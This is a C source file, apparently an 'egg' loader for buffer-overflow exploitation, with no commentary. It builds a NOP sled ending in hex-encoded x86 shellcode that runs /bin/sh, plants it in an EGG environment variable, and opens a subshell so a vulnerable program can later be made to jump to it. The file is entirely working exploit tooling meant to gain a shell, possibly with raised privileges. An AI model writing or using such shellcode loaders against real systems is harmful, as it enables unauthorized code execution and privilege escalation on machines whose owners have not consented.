#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUFSIZE 512
#define NOP 0x90
#define EGG "EGG"

char shellcode[] =
    "\xeb\x1c\x5b\x31\xc0\x88\x43\x07\x8d\x4b\x08\x89\x19\x8d\x53\x0c\x89\x02"
    "\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xdf\xff\xff\xff\x2f"
    "\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59";

int main(void) {
    char egg[BUFSIZE];
    memset(egg, NOP, BUFSIZE);
    memcpy(&egg[BUFSIZE - strlen(shellcode)], shellcode, strlen(shellcode));
    setenv(EGG, egg, 1);
    putenv(egg);
    printf("(entering subshell)\n");
    char *shell = getenv("SHELL");
    if (shell == NULL) {
        system("sh");
    }
    else {
        system(shell);
    }
    printf("(exiting subshell)\n");
    return 0;
}
